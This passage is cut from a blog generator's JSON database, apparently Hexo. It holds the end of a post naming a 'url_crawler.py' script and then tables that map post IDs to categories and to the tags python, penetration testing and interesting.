E:\\test\\url_crawler.py</span><br></pre></td></tr></table></figure>\n\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cknr54xgx00028ot9vxff82qp","category_id":"cknr54xh200038ot98f8e3c0r","_id":"cknr54xh500068ot9haigx0di"},{"post_id":"cknr54xhd000b8ot9ezfzar97","category_id":"cknr54xh200038ot98f8e3c0r","_id":"cknr54xhn000k8ot98y52n43j"},{"post_id":"cknr54xhg000f8ot9sbzynzvx","category_id":"cknr54xh200038ot98f8e3c0r","_id":"cknr54xho000o8ot9xmf2grc3"},{"post_id":"cknr54xhb00098ot9phelcr95","category_id":"cknr54xhg000d8ot92f1ec7ef","_id":"cknr54xhp000q8ot9n761riqr"},{"post_id":"cknr54xhi000h8ot9hhobu99y","category_id":"cknr54xhn000l8ot9f3psq0t8","_id":"cknr54xhr000u8ot9q1ookjcx"},{"post_id":"cknr54xhj000j8ot9g3rcsk99","category_id":"cknr54xhn000l8ot9f3psq0t8","_id":"cknr54xht000w8ot9n95wyvcx"},{"post_id":"cknr54xhj000j8ot9g3rcsk99","category_id":"cknr54xhs000v8ot9kgy506so","_id":"cknr54xht000x8ot9yfw2g1pk"}],"PostTag":[{"post_id":"cknr54xgx00028ot9vxff82qp","tag_id":"cknr54xh400048ot9z0ekhi8a","_id":"cknr54xh600078ot9xrx8wf1x"},{"post_id":"cknr54xgx00028ot9vxff82qp","tag_id":"cknr54xh500058ot9mmzu11d8","_id":"cknr54xh600088ot90gddh25t"},{"post_id":"cknr54xhb00098ot9phelcr95","tag_id":"cknr54xh500058ot9mmzu11d8","_id":"cknr54xhg000e8ot9i5aep9mo"},{"post_id":"cknr54xhd000b8ot9ezfzar97","tag_id":"cknr54xh400048ot9z0ekhi8a","_id":"cknr54xhh000g8ot9tx3rk03a"},{"post_id":"cknr54xhd000b8ot9ezfzar97","tag_id":"cknr54xh500058ot9mmzu11d8","_id":"cknr54xhj000i8ot9ymhaqhyk"},{"post_id":"cknr54xhg000f8ot9sbzynzvx","tag_id":"cknr54xh400048ot9z0ekhi8a","_id":"cknr54xho000n8ot9ieexx4bm"},{"post_id":"cknr54xhg000f8ot9sbzynzvx","tag_id":"cknr54xh500058ot9mmzu11d8","_id":"cknr54xhp000p8ot9jn6ahkgl"},{"post_id":"cknr54xhj000j8ot9g3rcsk99","tag_id":"cknr54xh400048ot9z0ekhi8a","_id":"cknr54xhp000r8ot9foo2t9ti"},{"post_id":"cknr54xhi000h8ot9hhobu99y","tag_id":"cknr54xho000m8ot9eycyg89n","_id":"cknr54xhr000t8ot9al9339e0"}],"Tag":[{"name":"python","_id":"cknr54xh400048ot9z0ekhi8a"},{"name":"渗透测试","_id":"cknr54xh500058ot9mmzu11d8"},{"name":"有趣","_id":"cknr54xho000m8ot9eycyg89n"}]}}